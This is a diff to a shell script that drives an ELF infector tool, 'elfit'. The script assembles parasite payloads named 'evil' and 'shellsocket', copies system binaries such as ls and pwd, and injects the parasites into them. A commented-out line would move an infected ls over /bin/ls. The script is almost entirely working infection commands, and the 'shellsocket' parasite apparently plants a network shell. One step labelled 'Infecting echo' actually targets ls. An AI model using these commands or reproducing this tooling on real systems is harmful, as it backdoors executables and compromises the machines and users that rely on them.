@@ -7,7 +7,22 @@ cd parasites
 nasm evil.asm
 nasm shellsocket.asm
 cd ..
-#./elfit -p parasites/evil -t -e ls > output
+cp /bin/ls /bin/cat /bin/pwd /bin/echo /bin/date .
+
+echo " #Infecting ls" >> output
+./elfit -p parasites/evil -t -e ls >> output
+echo "" >> output
+
+echo " #Infecting pwd" >> output
+./elfit -p parasites/shellsocket -r -e pwd >> output
+echo "" >> output
+
+echo " #Infecting echo" >> output
+./elfit -p parasites/evil -t --start-main init ls >> output
+echo "" >> output
+
+
+
 #chmod go-rw output
 #cp output /tmp
 #mv ls /bin/ls
